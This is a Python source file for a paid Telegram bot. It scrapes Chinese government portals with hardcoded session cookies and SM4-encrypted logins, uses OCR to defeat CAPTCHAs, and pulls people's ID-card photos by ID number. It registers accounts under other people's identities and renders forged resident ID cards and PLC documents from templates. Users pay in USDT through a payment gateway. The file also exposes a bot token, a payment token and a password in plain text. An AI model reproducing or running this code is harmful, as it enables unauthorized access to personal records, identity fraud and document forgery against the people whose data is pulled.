#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
print("===== Bot 最终版（自动识别验证码+完整功能）=====")

import os, time, json, io, tempfile, requests, urllib3, logging, re, random, threading, hashlib, hmac, urllib.parse, base64
from PIL import Image, ImageDraw, ImageFont
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters, CallbackQueryHandler
from flask import Flask, request, jsonify

try:
    import ddddocr
    OCR_AVAILABLE = True
except ImportError:
    OCR_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('MergedBot')

# ===== 配置 =====
BOT_TOKEN = os.environ.get('BOT_TOKEN') or "5849383582:AAERYX0V4qwtQGggXTWQsFI5rlojuNY6oWM"
BASE_COOKIES = {
    "cna": os.environ.get('CNA') or "REPLACE_CNA_HERE",
    "JSESSIONID": os.environ.get('JSESSIONID') or "REPLACE_JSESSIONID_HERE",
    "SESSION": os.environ.get('SESSION') or "REPLACE_SESSION_HERE",
    "SERVERID": os.environ.get('SERVERID') or "REPLACE_SERVERID_HERE",
}
ZWFW_TOKEN = os.environ.get('ZWFW_TOKEN') or "REPLACE_ZWFW_TOKEN_HERE"
FIXED_NAME = "刘德华"
SAVE_FOLDER = "temp_files"
RETRY_TIMES = 5
OKPAY_ID = int(os.environ.get('OKPAY_ID') or 36326)
OKPAY_TOKEN = os.environ.get('OKPAY_TOKEN') or 'TCtvS9O6idNOw3XaDyoTEEVG8awJCkdb'
OKPAY_API_URL = 'https://api.okaypay.me/shop/'
CALLBACK_URL = os.environ.get('CALLBACK_URL') or 'https://docs.okaypay.me/'
PORT = 8080
POINTS_RATE = 1
CHECK_INTERVAL = 0.5
ORDER_TIMEOUT = 1800
GX_QUERY_PRICE = 0.05
GX_PASSWORD = "268428."
ADMIN_IDS = [6040143940]

# ===== JSON存储 =====
USERS_FILE = "users.json"
try:
    with open(USERS_FILE, "r") as f:
        users = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    users = {}

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

def ensure_user(user_id):
    if str(user_id) not in users:
        users[str(user_id)] = {"points":0.0, "total_recharge":0.0, "invites":0, "last_sign_date":"", "created_at":time.strftime('%Y-%m-%d %H:%M:%S')}
        save_users()

def get_user_stats(user_id):
    ensure_user(user_id)
    d = users[str(user_id)]
    return {'points': d.get('points',0.0), 'total_recharge': d.get('total_recharge',0.0), 'last_sign_date': d.get('last_sign_date','')}

# ===== SM4加密（广西） =====
SM4_KEY="CatsPK0WWWRRhjkw"
SboxTable=[0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48]
FK=[0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]
CK=[0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279]
def rotl(x,n): return ((x<<n)&0xffffffff)|(((x-0x100000000 if x&0x80000000 else x)>>(32-n))&0xffffffff)
def sm4_sbox(a): return (SboxTable[(a>>24)&0xFF]<<24)|(SboxTable[(a>>16)&0xFF]<<16)|(SboxTable[(a>>8)&0xFF]<<8)|SboxTable[a&0xFF]
def sm4_lt(ka): bb=sm4_sbox(ka); return bb^rotl(bb,2)^rotl(bb,10)^rotl(bb,18)^rotl(bb,24)
def sm4_calci_rk(ka): bb=sm4_sbox(ka); return bb^rotl(bb,13)^rotl(bb,23)
def sm4_f(x0,x1,x2,x3,rk): return x0^sm4_lt(x1^x2^x3^rk)
def pkcs7_pad(data:bytes, block_size=16): pad_len=block_size-(len(data)%block_size); return data+bytes([pad_len])*pad_len
def sm4_encrypt_ecb(plain_text:str)->str:
    data=plain_text.encode('utf-8'); padded=pkcs7_pad(data,16); key_bytes=SM4_KEY.encode('utf-8')
    mk=[0]*4
    for i in range(4): mk[i]=(key_bytes[i*4]<<24)|(key_bytes[i*4+1]<<16)|(key_bytes[i*4+2]<<8)|key_bytes[i*4+3]
    k=[0]*36
    for i in range(4): k[i]=mk[i]^FK[i]
    sk=[0]*32
    for i in range(32):
        k[i+4]=k[i]^sm4_calci_rk(k[i+1]^k[i+2]^k[i+3]^CK[i]); sk[i]=k[i+4]
    result=bytearray()
    for offset in range(0,len(padded),16):
        block=padded[offset:offset+16]
        x=[0]*36
        for i in range(4): x[i]=(block[i*4]<<24)|(block[i*4+1]<<16)|(block[i*4+2]<<8)|block[i*4+3]
        for i in range(32): x[i+4]=sm4_f(x[i],x[i+1],x[i+2],x[i+3],sk[i])
        out=bytearray(16)
        for i in range(4):
            val=x[35-i]; out[i*4]=(val>>24)&0xFF; out[i*4+1]=(val>>16)&0xFF; out[i*4+2]=(val>>8)&0xFF; out[i*4+3]=val&0xFF
        result.extend(out)
    return base64.b64encode(result).decode('utf-8')

# ===== 广西函数（硬编码Cookie + 自动识别验证码） =====
GX_COOKIES = {
    ".AspNetCore.Antiforgery.CD28_gjGerY": "CfDJ8HV0mIggz4JMvqDIi_QjwskxMEP_MpAlDB9rnYQSowoWYUCdVBBEYHOOJJcdoaBPeoqTLpQNkBQRGIoqXtJkyeWU0L0niUEK552VhzEucJcpP2SWu9f85ceEyxpYDcWw2KnQK1jQ8nI30Ivd12zXiTs",
    "CatstiProject.Core.Web": "CfDJ8HV0mIggz4JMvqDIi%2FQjwsn8YSbEiJ34tq2SJhk6mZ5E4vRMSmyCKH4y7gdXMpZHhZ2FnASp6WC97XW0HotKzNl2%2FXOlkW%2BGx8THaduagf05YkfucQBDBIOYN9yQ3kAxANq47TEBHeZXtPMWMv%2BW5U9hLeoIhugINdCzCpnlyd2%2B"
}
GX_HEADERS_VERIFY = {"Host":"www.gxdlys.com","Connection":"keep-alive","Accept":"application/json, text/javascript, */*; q=0.01","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Referer":"http://www.gxdlys.com/Wechat/User/Regist","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
GX_HEADERS_LOGIN = {"Host":"www.gxdlys.com","Connection":"keep-alive","Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Origin":"http://www.gxdlys.com","Referer":"http://www.gxdlys.com/Wechat/Home/Login","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
GX_HEADERS_QUERY = {"User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
GX_HEADERS_FILE = {"Host":"www.gxdlys.com","Connection":"keep-alive","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Linux; U; Android 14; zh-cn; 22041216C Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 XiaoMi/MiuiBrowser/19.8.550718","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-miorigin":"s","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}

ocr = None
if OCR_AVAILABLE:
    try:
        ocr = ddddocr.DdddOcr()
        print("✅ 验证码自动识别已启用")
    except:
        ocr = None
        print("⚠️ ddddocr 初始化失败，将使用手动输入")

def gx_get_captcha(session):
    session.cookies.update(GX_COOKIES)
    for _ in range(3):
        try:
            r = session.get("http://www.gxdlys.com/Wechat/FaceDetect/GetVerifyCode", headers=GX_HEADERS_VERIFY, timeout=15)
            if r.status_code==200:
                d=r.json()
                if d.get("statusCode")==200:
                    uuid=d["data"].get("uuid")
                    img_b64=d["data"].get("img")
                    if uuid and img_b64:
                        if ocr:
                            try:
                                img_bytes = base64.b64decode(img_b64)
                                code = ocr.classification(img_bytes)
                                code = re.sub(r'[^A-Z0-9]', '', code.upper())
                                if code:
                                    return True, img_b64, uuid, code
                            except Exception as e:
                                logger.warning(f"OCR识别失败: {e}")
                        return True, img_b64, uuid, None
        except: pass
        time.sleep(1)
    return False, None, None, None

def gx_login(session, id_card):
    session.cookies.update(GX_COOKIES)
    enc_login=urllib.parse.quote(sm4_encrypt_ecb(id_card))
    enc_pwd=urllib.parse.quote(sm4_encrypt_ecb(GX_PASSWORD))
    data=f"loginName={enc_login}&password={enc_pwd}&wechatUid="
    try:
        r=session.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=GX_HEADERS_LOGIN, data=data, timeout=30)
        if r.status_code==200:
            res=r.json()
            if res.get("statusCode")==200 and res.get("info")=="登录成功": return True,"登录成功"
            else: return False, res.get("info","登录失败")
        return False, f"HTTP {r.status_code}"
    except Exception as e: return False, str(e)

def gx_query_photo(session, name, id_card, uuid, code):
    session.cookies.update(GX_COOKIES)
    url=f"http://www.gxdlys.com/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={name}&uuid={uuid}&code={code}"
    try:
        r=session.get(url, headers=GX_HEADERS_QUERY, timeout=30)
        if r.status_code==200:
            res=r.json()
            if res.get("statusCode")==200:
                file_id=res.get("data",{}).get("item1")
                if file_id: return True, file_id, None
                return False, None, "未获取到照片ID"
            else: return False, None, res.get("info","查询失败")
        return False, None, f"HTTP {r.status_code}"
    except Exception as e: return False, None, str(e)

def gx_download_photo(session, file_id):
    session.cookies.update(GX_COOKIES)
    url=f"http://www.gxdlys.com/System/FileService/ShowFile?fileId={file_id}"
    try:
        r=session.get(url, headers=GX_HEADERS_FILE, timeout=30)
        if r.status_code==200 and 'image' in r.headers.get('Content-Type',''):
            return True, r.content
        return False, "下载失败"
    except Exception as e: return False, str(e)

def gx_send_sms(session, phone, captcha_code, uuid):
    session.cookies.update(GX_COOKIES)
    data={"phoneId":phone,"type":"10001","IsEncryptPhoneId":"false","verifyCode":captcha_code,"uuid":uuid}
    headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Accept":"application/json, text/javascript, */*; q=0.01","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
    try:
        r=session.post("http://www.gxdlys.com/System/SmsService/PostVerifyCode", data=data, headers=headers, timeout=30)
        if r.status_code==200:
            res=r.json(); return res.get("statusCode")==200
        return False
    except: return False

def gx_register(session, phone, sms_code, captcha_code, real_name, id_card):
    session.cookies.update(GX_COOKIES)
    data={"zipArea":"","userType":"-1","wechatUid":"","realName":real_name,"iDCard":id_card,"loginName":id_card,"password":GX_PASSWORD,"idcardImg1Url":"218,8a785f252c8518","idcardImg2Url":"216,8a7860c46589f3","idcardImg3Url":"214,8a78664776227f","idcardImg4Url":"","ownerId":"","tel":phone,"isTelEncrypted":"false","validCode":sms_code,"verifyCode":captcha_code}
    headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e37) NetType/4G Language/zh_CN","X-Requested-With":"XMLHttpRequest","Accept":"application/json, text/javascript, */*; q=0.01","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}
    try:
        r=session.post("http://www.gxdlys.com/Wechat/User/RegistAdd", data=data, headers=headers, timeout=30)
        if r.status_code==200:
            res=r.json(); return res.get("statusCode")==200, res.get("info","")
        return False, str(r.status_code)
    except Exception as e: return False, str(e)

# ===== 身份证生成函数（完整） =====
HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
def query_id_card_sync(id_card):
    id_card=id_card.strip().upper()
    if len(id_card)!=18 or not id_card[:17].isdigit() or id_card[17] not in '0123456789X': return False,"身份证号无效"
    if not os.path.exists(SAVE_FOLDER): os.makedirs(SAVE_FOLDER)
    session=requests.Session(); session.cookies.update(BASE_COOKIES); session.verify=False
    url1="https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial"
    data={"itemMaterialId":"1498591712970792960","materialCode":"1173207393439670272","materialName":"委托书原件及委托代理人的身份证明","interfaceParam":"ztmc,zzbh,dzzz_name,cardid,dzzz_type","interfaceParamName":"身份证","canShare":False,"isSignature":"N","appInterfaceId":"136","param":{"ztmc":FIXED_NAME,"zzbh":"","dzzz_name":"随便起个名","cardid":id_card,"dzzz_type":"1"},"itemId":"1047370300041120912","userId":"1547878749006024704"}
    for attempt in range(RETRY_TIMES):
        try: res1=session.post(url1, headers=HEADERS1, json=data, timeout=30); result1=res1.json()
        except Exception as e: print(f"[{attempt+1}/{RETRY_TIMES}] 请求异常: {e}"); time.sleep(2); continue
        print(f"[{attempt+1}/{RETRY_TIMES}] 服务端返回: {json.dumps(result1, ensure_ascii=False, indent=2)}")
        if result1.get("code")=="1":
            try:
                attachment_id=result1["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
                res2=session.get(f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{attachment_id}", headers=HEADERS2, timeout=30)
                if res2.status_code==200: return True, res2.content
                else: return False, f"下载失败 HTTP {res2.status_code}"
            except Exception as e: return False, f"解析失败: {e}"
        else: print(f"[{attempt+1}/{RETRY_TIMES}] 查询失败: {result1.get('message')}"); time.sleep(2)
    return False, f"连续 {RETRY_TIMES} 次失败"

def remove_white_background(img, threshold=240):
    if img.mode!='RGBA': img=img.convert('RGBA')
    data=img.getdata(); new_data=[]
    for item in data:
        r,g,b,a=item
        if r>threshold and g>threshold and b>threshold and a!=0: new_data.append((r,g,b,0))
        else: new_data.append(item)
    img.putdata(new_data); return img

def load_issuing_authority_map(file_path):
    m={}
    with open(file_path,'r',encoding='utf-8') as f:
        for line in f:
            line=line.strip()
            if line:
                code,authority=line.split(':'); m[code]=authority
    return m

def get_issuing_authority(id_number, m): return m.get(id_number[:6],"未知签发机关")

def format_address(address, max_chars_per_line=11):
    return [address[i:i+max_chars_per_line] for i in range(0,len(address),max_chars_per_line)]

def generate_id_card_sync(name,id_number,nation,address,expiration_date,user_photo_path):
    if len(id_number)<18: raise ValueError("身份证号码格式不正确")
    birth_date=id_number[6:14]; gender='女' if int(id_number[-2])%2==0 else '男'
    m=load_issuing_authority_map('fonts/签发机关.txt'); issuing_authority=get_issuing_authority(id_number,m)
    template=Image.open('fonts/empty.png').convert("RGBA")
    name_font=ImageFont.truetype('fonts/hei.ttf',72); other_font=ImageFont.truetype('fonts/hei.ttf',64); birth_font=ImageFont.truetype('fonts/fzhei.ttf',60); id_font=ImageFont.truetype('fonts/ocrb10bt.ttf',90)
    draw=ImageDraw.Draw(template)
    draw.text((630,690),name,font=name_font,fill='black')
    draw.text((630,840),gender,font=other_font,fill='black')
    draw.text((1030,840),nation,font=other_font,fill='black')
    draw.text((630,975),birth_date[:4],font=birth_font,fill='black')
    draw.text((950,975),birth_date[4:6],font=birth_font,fill='black')
    draw.text((1150,975),birth_date[6:],font=birth_font,fill='black')
    y=1115
    for line in format_address(address):
        draw.text((630,y),line,font=other_font,fill='black'); y+=85
    draw.text((900,1475),id_number,font=id_font,fill='black')
    draw.text((1050,2750),issuing_authority,font=other_font,fill='black')
    draw.text((1050,2895),expiration_date,font=other_font,fill='black')
    photo=Image.open(user_photo_path).convert("RGBA"); photo=remove_white_background(photo,240); photo=photo.resize((500,670)); template.paste(photo,(1500,670),mask=photo)
    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h); c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
    return img_bytes,pdf_bytes

def load_area_map():
    m={}
    file_path='plc/地区.txt'
    if not os.path.exists(file_path): print("警告: 地区文件不存在"); return m
    try:
        with open(file_path,'r',encoding='utf-8') as f:
            for line in f:
                line=line.strip()
                if not line: continue
                parts=line.split(',',1)
                if len(parts)==2:
                    code,name=parts[0].strip(), parts[1].strip(); m[code]=name
        print(f"已加载地区数据，共 {len(m)} 条记录")
    except Exception as e: print("加载地区文件失败: "+str(e))
    return m
AREA_MAP=load_area_map()
def get_address_from_idcard(id_card): return AREA_MAP.get(id_card[:6],None)

def generate_plc_sync(name,id_card,address,avatar_path):
    if len(id_card)!=18: raise ValueError("身份证号必须为18位")
    gender="男" if int(id_card[16])%2==1 else "女"
    if not os.path.exists('plc/mb.jpg'): raise FileNotFoundError("PLC模板文件 mb.jpg 不存在")
    if not os.path.exists('plc/10.ttf'): raise FileNotFoundError("PLC字体文件 10.ttf 不存在")
    template=Image.open('plc/mb.jpg').convert("RGBA")
    avatar=Image.open(avatar_path).convert("RGBA"); avatar=remove_white_background(avatar,240); avatar=avatar.resize((416,500)); template.paste(avatar,(26,333),mask=avatar)
    draw=ImageDraw.Draw(template); font=ImageFont.truetype('plc/10.ttf',55)
    year=id_card[6:10]; month=id_card[10:12]; day=id_card[12:14]; birth_str=f"{year}年{month}月{day}日"
    draw.text((598,314),name,font=font,fill=(0,0,0))
    draw.text((598,398),gender,font=font,fill=(0,0,0))
    draw.text((474,641),id_card,font=font,fill=(0,0,0))
    draw.text((718,482),birth_str,font=font,fill=(0,0,0))
    address_lines=[address[i:i+11] for i in range(0,len(address),11)]
    for i,line in enumerate(address_lines): draw.text((473,782+i*60),line,font=font,fill=(0,0,0))
    img_bytes=io.BytesIO(); template.save(img_bytes,format='PNG'); img_bytes.seek(0)
    pdf_bytes=io.BytesIO(); c=canvas.Canvas(pdf_bytes,pagesize=A4); w,h=template.size; scale=min(A4[0]/w,A4[1]/h)
    with tempfile.NamedTemporaryFile(suffix='.png',delete=False) as tmp: tmp_path=tmp.name; template.save(tmp_path,format='PNG')
    c.drawImage(tmp_path,(A4[0]-w*scale)/2,(A4[1]-h*scale)/2,w*scale,h*scale); c.save(); pdf_bytes.seek(0); os.remove(tmp_path)
    return img_bytes,pdf_bytes

# ===== OkayPay =====
class OkayPay:
    def __init__(self,appid,token,api_url): self.appid=appid; self.token=token; self.api_url=api_url
    def _build_base(self,params):
        params={k:v for k,v in params.items() if k!='sign' and v is not None and v!=''}
        def flatten(obj,prefix=''):
            items={}
            if isinstance(obj,dict):
                for k,v in obj.items():
                    key=f"{prefix}.{k}" if prefix else k
                    if isinstance(v,dict): items.update(flatten(v,key))
                    else: items[key]=v
            else: items[prefix]=obj
            return items
        flat={}
        for k,v in params.items():
            if isinstance(v,dict): flat.update(flatten(v,k))
            elif isinstance(v,bool): flat[k]='true' if v else 'false'
            else: flat[k]=str(v)
        sorted_params=dict(sorted(flat.items()))
        base='&'.join([f"{k}={v}" for k,v in sorted_params.items()])
        return base
    def _sign(self,params):
        base=self._build_base(params)
        sign=hmac.new(self.token.encode('utf-8'), base.encode('utf-8'), hashlib.sha256).hexdigest().upper()
        return sign
    def _signed_params(self,params):
        nonce=''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=16))
        timestamp=int(time.time())
        full_params={'id':str(self.appid),'timestamp':timestamp,'nonce':nonce,**params}
        full_params['sign']=self._sign(full_params)
        return full_params
    def verify(self,data):
        if 'sign' not in data: return False
        in_sign=data['sign']; calc_sign=self._sign(data); return calc_sign==in_sign
    def pay_link(self,amount,unique_id):
        params={'amount':f"{amount:.2f}",'coin':'USDT','unique_id':unique_id,'name':'积分充值','callback_url':CALLBACK_URL,'return_url':CALLBACK_URL}
        signed=self._signed_params(params)
        try:
            resp=requests.post(self.api_url+'payLink', data=signed, headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=15, verify=False)
            if resp.status_code==200:
                result=resp.json()
                if result.get('status')=='success' and self.verify(result): return result
                else: return {'status':'error','msg':result.get('msg','未知错误')}
            else: return {'status':'error','msg':f'HTTP {resp.status_code}'}
        except Exception as e: return {'status':'error','msg':str(e)}
    def check_deposit(self,unique_id):
        params={'unique_id':unique_id}; signed=self._signed_params(params)
        try:
            resp=requests.post(self.api_url+'checkDeposit', data=signed, headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=15, verify=False)
            if resp.status_code==200:
                result=resp.json()
                if result.get('status')=='success' and self.verify(result): return result
                else: return {'status':'error','msg':result.get('msg','验证失败')}
            else: return {'status':'error','msg':f'HTTP {resp.status_code}'}
        except Exception as e: return {'status':'error','msg':str(e)}

client=OkayPay(OKPAY_ID, OKPAY_TOKEN, OKPAY_API_URL)
orders={}

def check_orders():
    while True:
        try:
            now=time.time(); expired=[]
            for uid, info in list(orders.items()):
                if now-info['timestamp']>ORDER_TIMEOUT: expired.append(uid); continue
                if info['status']=='pending':
                    result=client.check_deposit(uid)
                    if result and result.get('status')=='success':
                        data=result.get('data',{}); status=data.get('status')
                        if status==1:
                            user_id=info['user_id']; amount=float(data.get('amount',0)); order_id=data.get('order_id')
                            points=amount*POINTS_RATE
                            ensure_user(user_id)
                            users[str(user_id)]['points']=users[str(user_id)].get('points',0.0)+points
                            users[str(user_id)]['total_recharge']=users[str(user_id)].get('total_recharge',0.0)+amount
                            save_users()
                            stats=get_user_stats(user_id)
                            try: bot.send_message(user_id, f"✅ 支付成功！\n订单号: {order_id}\n充值: {amount:.2f} USDT\n获得积分: {points:.2f}\n当前积分: {stats['points']:.2f}")
                            except: pass
                            orders[uid]['status']='completed'
            for uid in expired:
                user_id=orders[uid]['user_id']
                try: bot.send_message(user_id, f"⏰ 订单 {uid} 已过期")
                except: pass
                del orders[uid]
        except Exception as e: logger.error(f"轮询异常: {e}")
        time.sleep(CHECK_INTERVAL)

flask_app=Flask(__name__)
@flask_app.route('/OkPay.php', methods=['POST'])
def callback():
    try:
        data=request.get_json() if request.content_type and 'application/json' in request.content_type else request.form.to_dict()
        if not client.verify(data): return jsonify({'status':'success'}),200
        return jsonify({'status':'success'}),200
    except: return jsonify({'status':'success'}),200

def run_flask(): flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
